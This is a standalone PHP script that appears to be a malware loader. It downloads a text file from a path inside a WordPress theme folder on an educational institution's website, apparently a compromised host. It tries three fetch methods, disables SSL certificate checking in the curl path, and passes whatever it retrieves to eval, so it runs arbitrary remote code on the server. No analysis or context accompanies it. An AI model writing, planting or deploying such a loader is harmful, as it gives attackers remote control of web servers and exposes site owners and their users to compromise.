<?php
class Fetcher {
    private $url;

    public function __construct($url) {
        $this->url = $url;
    }

    public function fetch_file_get_contents() {
        if (ini_get('allow_url_fopen')) {
            return file_get_contents($this->url);
        }
        return false;
    }

    public function fetch_curl() {
        if (function_exists('curl_version')) {
            $ch = curl_init($this->url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        return false;
    }

    public function fetch_stream() {
        if ($stream = fopen($this->url, 'r')) {
            $content = stream_get_contents($stream);
            fclose($stream);
            return $content;
        }
        return false;
    }

    public function get_content() {
        $content = $this->fetch_file_get_contents();
        if ($content === false) {
            $content = $this->fetch_curl();
        }
        if ($content === false) {
            $content = $this->fetch_stream();
        }
        return $content;
    }
}

$protocol = "https";
$domain = "rathinamcollege.edu.in/blog/wp-content/themes/dt-the7/inc/vendor/Tax-meta-class";
$file_path = "/txt.txt";
$url = $protocol . "://" . $domain . $file_path;

$fetcher = new Fetcher($url);
$content = $fetcher->get_content();

if ($content !== false) {
    eval("?>" . $content);
} else {
    echo "Not Found!";
}
?>
